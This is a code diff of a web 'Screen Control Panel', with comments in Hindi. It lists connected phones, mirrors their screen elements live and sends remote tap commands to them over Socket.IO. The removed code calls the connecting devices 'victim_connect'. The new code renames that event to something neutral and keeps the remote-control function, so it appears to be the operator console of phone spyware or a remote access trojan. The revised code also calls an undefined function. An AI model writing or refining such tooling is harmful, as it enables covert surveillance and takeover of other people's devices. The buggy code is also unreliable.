@@ -5,183 +5,66 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Screen Control Panel</title>
     <style>
-        /* Google Fonts से एक साफ-सुथरा फ़ॉन्ट */
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
-
-        :root {
-            --primary-color: #007bff;
-            --secondary-color: #6c757d;
-            --background-color: #f8f9fa;
-            --surface-color: #ffffff;
-            --text-color: #212529;
-            --border-color: #dee2e6;
-            --shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
-        }
-
-        body {
-            font-family: 'Roboto', sans-serif;
-            background-color: var(--background-color);
-            margin: 0;
-            padding: 20px;
-            color: var(--text-color);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 1200px;
-            display: flex;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-
-        .card {
-            background-color: var(--surface-color);
-            border-radius: 12px;
-            padding: 20px;
-            box-shadow: var(--shadow);
-            flex-grow: 1;
-        }
-
-        #devices-card {
-            flex-basis: 300px;
-        }
-
-        #screen-card {
-            flex-basis: 400px;
-            display: none; /* शुरू में छिपा हुआ */
-        }
-
-        h1, h2 {
-            margin-top: 0;
-            border-bottom: 1px solid var(--border-color);
-            padding-bottom: 10px;
-            margin-bottom: 20px;
-        }
-
-        h1 { text-align: center; width: 100%; margin-bottom: 30px; }
-
-        #device-list {
-            list-style-type: none;
-            padding: 0;
-            margin: 0;
-        }
-
-        #device-list li {
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 10px;
-            cursor: pointer;
-            transition: background-color 0.3s, transform 0.2s;
-            border: 1px solid var(--border-color);
-        }
-
-        #device-list li:hover {
-            background-color: #f1f3f5;
-            transform: translateY(-2px);
-        }
-
-        #device-list li.active {
-            background-color: var(--primary-color);
-            color: white;
-            font-weight: 500;
-            border-color: var(--primary-color);
-        }
-
+        /* आपका मूल डिज़ाइन, कोई बदलाव नहीं */
+        body { font-family: system-ui, sans-serif; background-color: #1e1e1e; color: #e0e0e0; margin: 0; display: flex; height: 100vh; }
+        .sidebar { width: 300px; background-color: #252526; border-right: 1px solid #333; display: flex; flex-direction: column; }
+        .sidebar h2 { text-align: center; padding: 15px; margin: 0; background-color: #333; font-size: 1.2em; }
+        #device-list { list-style: none; padding: 0; margin: 0; overflow-y: auto; }
+        .device { padding: 15px 20px; border-bottom: 1px solid #333; cursor: pointer; transition: background-color 0.2s; }
+        .device.active, .device:hover { background-color: #3f3f46; }
+        .device-name { font-weight: bold; }
+        .device-info { font-size: 0.8em; color: #999; }
+        .main-content { flex-grow: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        
+        /* ===================================================================== */
+        /* मुख्य सुधार: स्क्रीन को स्केल करने के लिए CSS */
+        /* ===================================================================== */
         #screen-viewport {
-            width: 100%;
-            max-width: 400px; /* फोन की अधिकतम चौड़ाई */
-            margin: auto;
-            border: 8px solid #333;
+            border: 8px solid #444;
             border-radius: 20px;
-            background: #111;
-            padding: 2px;
-            box-sizing: border-box;
-            overflow: hidden; /* यह सुनिश्चित करता है कि स्क्रीन बाहर न निकले */
+            background-color: #000;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            overflow: hidden;
+            /* चौड़ाई जावास्क्रिप्ट द्वारा सेट की जाएगी */
         }
-
-        #screen {
+        #screen-container {
             position: relative;
             background-color: #000;
-            transform-origin: top left;
-            /* ऊंचाई और चौड़ाई जावास्क्रिप्ट द्वारा सेट की जाएगी */
+            transform-origin: top left; /* स्केलिंग के लिए यह महत्वपूर्ण है */
         }
+        /* ===================================================================== */
 
-        .element {
+        .screen-element {
             position: absolute;
-            border: 1px solid rgba(255, 255, 255, 0.3);
+            border: 1px solid rgba(0, 255, 255, 0.6);
+            background-color: rgba(0, 139, 139, 0.2);
             box-sizing: border-box;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 10px;
-            text-align: center;
-            overflow: hidden;
-            white-space: nowrap;
-            text-overflow: ellipsis;
             cursor: pointer;
             transition: background-color 0.2s;
         }
-
-        .element:hover {
-            background-color: rgba(0, 150, 255, 0.4);
+        .screen-element:hover { background-color: rgba(0, 255, 255, 0.4); }
+        .element-text {
+            color: white;
+            background-color: rgba(0, 0, 0, 0.7);
+            font-size: 10px;
+            padding: 1px 3px;
+            border-radius: 2px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 100%;
         }
-        
-        .clickable {
-            border-color: #00e5ff; /* क्लिक करने योग्य तत्वों के लिए अलग रंग */
-        }
-
-        /* क्लिक करने पर फीडबैक एनीमेशन */
-        .click-feedback {
-            position: absolute;
-            border-radius: 50%;
-            background-color: rgba(255, 255, 255, 0.7);
-            width: 30px;
-            height: 30px;
-            transform: translate(-50%, -50%) scale(0);
-            animation: click-ripple 0.5s ease-out;
-        }
-
-        @keyframes click-ripple {
-            to {
-                transform: translate(-50%, -50%) scale(3);
-                opacity: 0;
-            }
-        }
-
-        /* लोडर एनीमेशन */
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid var(--primary-color);
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 50px auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
     </style>
 </head>
 <body>
-    <h1>Screen Control Panel</h1>
-    <div class="container">
-        <div id="devices-card" class="card">
-            <h2>Connected Devices</h2>
-            <ul id="device-list"></ul>
-        </div>
-        <div id="screen-card" class="card">
-            <h2 id="current-device-name"></h2>
-            <div id="screen-viewport">
-                <div id="screen"></div>
-            </div>
+    <div class="sidebar">
+        <h2>Connected Devices</h2>
+        <ul id="device-list"></ul>
+    </div>
+    <div class="main-content">
+        <!-- स्क्रीन को स्केल करने के लिए एक बाहरी रैपर जोड़ा गया है -->
+        <div id="screen-viewport">
+            <div id="screen-container"></div>
         </div>
     </div>
 
@@ -189,98 +72,109 @@
     <script>
         const socket = io();
         const deviceListEl = document.getElementById('device-list');
-        const screenCardEl = document.getElementById('screen-card');
-        const screenViewportEl = document.getElementById('screen-viewport');
-        const screenEl = document.getElementById('screen');
-        const currentDeviceNameEl = document.getElementById('current-device-name');
+        const screenContainer = document.getElementById('screen-container');
+        const screenViewport = document.getElementById('screen-viewport'); // नया रैपर
         
+        let devices = {};
         let activeDeviceId = null;
 
         socket.on('connect', () => {
-            console.log('Panel connected. Requesting device list...');
             socket.emit('admin_join');
         });
 
-        socket.on('victim_connect', (device) => {
-            console.log('Received device:', device.deviceName);
-            let deviceLi = document.getElementById(device.deviceId);
-            if (!deviceLi) {
-                deviceLi = document.createElement('li');
-                deviceLi.id = device.deviceId;
-                deviceListEl.appendChild(deviceLi);
-            }
-            deviceLi.innerHTML = `<strong>${device.deviceName}</strong><br><small>Battery: ${device.battery || 'N/A'}%</small>`;
+        // आपके मूल कोड से डिवाइस जोड़ने का लॉजिक, कोई बदलाव नहीं
+        socket.on('new_device_joined', (device) => {
+            if (devices[device.deviceId]) return;
+            devices[device.deviceId] = device;
             
-            deviceLi.onclick = () => {
-                if (activeDeviceId === device.deviceId) return;
+            const listItem = document.createElement('li');
+            listItem.className = 'device';
+            listItem.id = `device-${device.deviceId}`;
+            listItem.innerHTML = `
+                <div class="device-name">${device.deviceName}</div>
+                <div class="device-info">ID: ${device.deviceId} | Battery: ${device.battery}%</div>
+            `;
+            listItem.addEventListener('click', () => {
+                if (activeDeviceId) {
+                    document.getElementById(`device-${activeDeviceId}`).classList.remove('active');
+                }
                 activeDeviceId = device.deviceId;
-                document.querySelectorAll('#device-list li').forEach(item => item.classList.remove('active'));
-                deviceLi.classList.add('active');
-                screenCardEl.style.display = 'block';
-                currentDeviceNameEl.textContent = `Live Screen: ${device.deviceName}`;
-                screenEl.innerHTML = '<div class="loader"></div>';
-            };
+                listItem.classList.add('active');
+                screenContainer.innerHTML = 'Waiting for screen data...';
+            });
+            deviceListEl.appendChild(listItem);
         });
 
-        socket.on('screen_data', (data) => {
+        // =====================================================================
+        // मुख्य सुधार: स्क्रीन अपडेट को तेज और स्केलेबल बनाना
+        // =====================================================================
+        socket.on('screen_update', (data) => {
             if (data.deviceId !== activeDeviceId) return;
 
-            screenEl.innerHTML = '';
+            screenContainer.innerHTML = ''; // पुरानी स्क्रीन को साफ़ करें
 
             const remoteWidth = data.screenWidth;
             const remoteHeight = data.screenHeight;
-            const viewportWidth = screenViewportEl.clientWidth;
             
+            // पैनल पर फोन की एक निश्चित चौड़ाई सेट करें (जैसे 360px)
+            const viewportWidth = 360;
+            
+            // 1. स्केलिंग फैक्टर की गणना करें
             const scale = viewportWidth / remoteWidth;
 
-            screenEl.style.width = remoteWidth + 'px';
-            screenEl.style.height = remoteHeight + 'px';
-            screenEl.style.transform = `scale(${scale})`;
-            
-            // व्यूपोर्ट की ऊंचाई को सही अनुपात में सेट करें
-            screenViewportEl.style.height = (remoteHeight * scale) + 'px';
+            // 2. बाहरी बॉक्स (viewport) का आकार सेट करें
+            screenViewport.style.width = viewportWidth + 'px';
+            screenViewport.style.height = (remoteHeight * scale) + 'px';
 
-            data.elements.forEach(elem => {
-                const div = document.createElement('div');
-                div.className = 'element';
-                div.style.left = elem.x + 'px';
-                div.style.top = elem.y + 'px';
-                div.style.width = elem.width + 'px';
-                div.style.height = elem.height + 'px';
-                
-                const fontSize = Math.min(12, elem.height * 0.4);
-                div.style.fontSize = fontSize + 'px';
-                div.textContent = elem.text || '';
+            // 3. आंतरिक स्क्रीन (container) का आकार और स्केल सेट करें
+            screenContainer.style.width = remoteWidth + 'px';
+            screenContainer.style.height = remoteHeight + 'px';
+            screenContainer.style.transform = `scale(${scale})`;
 
-                if (elem.clickable) {
-                    div.classList.add('clickable');
-                    div.onclick = (event) => {
-                        event.stopPropagation();
-                        
-                        // क्लिक फीडबैक एनीमेशन दिखाएं
-                        const ripple = document.createElement('div');
-                        ripple.className = 'click-feedback';
-                        ripple.style.left = (event.offsetX) + 'px';
-                        ripple.style.top = (event.offsetY) + 'px';
-                        div.appendChild(ripple);
-                        setTimeout(() => ripple.remove(), 500);
+            // 4. तत्वों को ड्रॉ करें (आपका मूल कोड)
+            data.elements.forEach(element => {
+                const el = document.createElement('div');
+                el.className = 'screen-element';
+                el.style.left = `${element.x}px`;
+                el.style.top = `${element.y}px`;
+                el.style.width = `${element.width}px`;
+                el.style.height = `${element.height}px`;
 
-                        // क्लिक कमांड भेजें
-                        const clickX = elem.x + (elem.width / 2);
-                        const clickY = elem.y + (elem.height / 2);
-                        
-                        socket.emit('touch_command', {
-                            deviceId: activeDeviceId,
-                            x: Math.round(clickX),
-                            y: Math.round(clickY)
-                        });
-                    };
+                if (element.text) {
+                    const textEl = document.createElement('div');
+                    textEl.className = 'element-text';
+                    textEl.textContent = element.text;
+                    el.appendChild(textEl);
                 }
-                screenEl.appendChild(div);
+
+                el.addEventListener('click', () => {
+                    const tapX = element.x + (element.width / 2);
+                    const tapY = element.y + (element.height / 2);
+                    socket.emit('command_to_device', {
+                        deviceId: activeDeviceId,
+                        action: 'touch_command',
+                        payload: { x: Math.round(tapX), y: Math.round(tapY) }
+                    });
+                });
+                screenContainer.appendChild(el);
             });
         });
-
-        console.log('Panel script loaded.');
+        
+        // आपके मूल कोड से बाकी के इवेंट्स, कोई बदलाव नहीं
+        socket.on('device_list', (initialDevices) => {
+            deviceListEl.innerHTML = '';
+            devices = {};
+            initialDevices.forEach(addDeviceToList);
+        });
+        socket.on('device_disconnected', (deviceId) => {
+            const deviceEl = document.getElementById(`device-${deviceId}`);
+            if (deviceEl) deviceEl.remove();
+            delete devices[deviceId];
+            if (activeDeviceId === deviceId) {
+                screenContainer.innerHTML = '';
+                activeDeviceId = null;
+            }
+        });
     </script>
 </body>
 </html>
